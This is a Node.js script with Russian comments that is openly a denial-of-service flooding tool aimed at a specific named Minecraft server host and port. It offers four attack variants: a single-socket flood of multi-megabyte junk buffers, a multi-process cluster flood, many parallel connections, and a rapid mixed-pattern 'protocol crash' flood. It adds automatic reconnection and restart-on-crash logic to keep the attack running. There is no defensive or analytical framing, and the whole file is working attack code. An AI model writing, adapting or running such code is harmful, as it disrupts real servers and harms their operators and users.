import net from 'net';
import cluster from 'cluster';
import os from 'os';

// Вариант 1: Экономный по памяти
function floodServer() {
    const socket = net.connect(25069, 'vladlohh3.aternos.me');
    
    socket.on('connect', () => {
        console.log('Подключен для флуда');
        
        // Используем ОДИН буфер для всех пакетов (экономия памяти)
        const garbage = Buffer.alloc(10 * 1024 * 1024, 0xFF); // 10MB заполненный 0xFF
        
        const floodInterval = setInterval(() => {
            try {
                socket.write(garbage);
                console.log('Флуд пакет отправлен');
            } catch (error) {
                console.log('Ошибка отправки:', error.message);
                clearInterval(floodInterval);
            }
        }, 50); // Увеличиваем частоту
        
        socket.on('error', (err) => {
            console.log('Ошибка сокета:', err.message);
            clearInterval(floodInterval);
        });
        
        socket.on('close', () => {
            console.log('Соединение разорвано');
            clearInterval(floodInterval);
        });
        
        // Авто-переподключение через 10 секунд
        setTimeout(() => {
            socket.destroy();
            setTimeout(floodServer, 1000);
        }, 10000);
    });
    
    socket.on('error', () => {
        setTimeout(floodServer, 2000);
    });
}

// Вариант 2: Многопоточный флуд
function multiThreadFlood() {
    if (cluster.isPrimary) {
        console.log(`Запуск ${os.cpus().length} потоков флуда`);
        
        for (let i = 0; i < os.cpus().length; i++) {
            cluster.fork();
        }
        
        cluster.on('exit', (worker) => {
            console.log(`Поток ${worker.process.pid} умер, перезапуск...`);
            cluster.fork();
        });
    } else {
        // Воркер процесс
        floodServer();
    }
}

// Вариант 3: Агрессивный флуд с контролем памяти
function aggressiveFlood() {
    const connections = [];
    const BUFFER_SIZE = 5 * 1024 * 1024; // 5MB
    const garbage = Buffer.alloc(BUFFER_SIZE, 0x41); // Заполняем 'A'
    
    // Создаем много соединений
    for (let i = 0; i < 10; i++) {
        setTimeout(() => {
            const socket = net.connect(25069, 'vladlohh3.aternos.me');
            connections.push(socket);
            
            socket.on('connect', () => {
                console.log(`Соединение ${i} установлено`);
                
                // Флудим каждым соединением
                const interval = setInterval(() => {
                    if (socket.destroyed) {
                        clearInterval(interval);
                        return;
                    }
                    try {
                        socket.write(garbage);
                    } catch (error) {
                        clearInterval(interval);
                    }
                }, 100);
                
                socket.interval = interval;
            });
            
            socket.on('error', () => {
                // Игнорируем ошибки, переподключаемся
                setTimeout(() => {
                    const newSocket = net.connect(25069, 'vladlohh3.aternos.me');
                    connections.push(newSocket);
                }, 1000);
            });
            
        }, i * 500);
    }
}

// Вариант 4: Умный флуд с разными типами данных
function smartFlood() {
    const patterns = [
        Buffer.alloc(2 * 1024 * 1024, 0x00), // Нули
        Buffer.alloc(2 * 1024 * 1024, 0xFF), // Единицы  
        Buffer.alloc(2 * 1024 * 1024, 0x41), // Буквы A
        Buffer.from('MINECRAFT_PROTOCOL_CRASH' + '!'.repeat(1024*1024)) // Текст
    ];
    
    let patternIndex = 0;
    
    const socket = net.connect(25069, 'vladlohh3.aternos.me');
    
    socket.on('connect', () => {
        console.log('Умный флуд запущен');
        
        const floodInterval = setInterval(() => {
            const data = patterns[patternIndex % patterns.length];
            patternIndex++;
            
            try {
                socket.write(data);
                console.log('Отправлен паттерн', patternIndex);
            } catch (error) {
                clearInterval(floodInterval);
            }
        }, 10); // Очень быстро
    });
}

// Запускаем
console.log('Запуск DDoS атаки на сервер...');

// Выбери один из методов:
floodServer();        // Базовый
// multiThreadFlood();   // Многопоточный
// aggressiveFlood();     // Агрессивный многоканальный
// smartFlood();         // Умный с разными данными

// Автоматический перезапуск если все упало
process.on('uncaughtException', (error) => {
    console.log('Критическая ошибка:', error.message);
    console.log('Перезапуск через 5 секунд...');
    setTimeout(aggressiveFlood, 5000);
});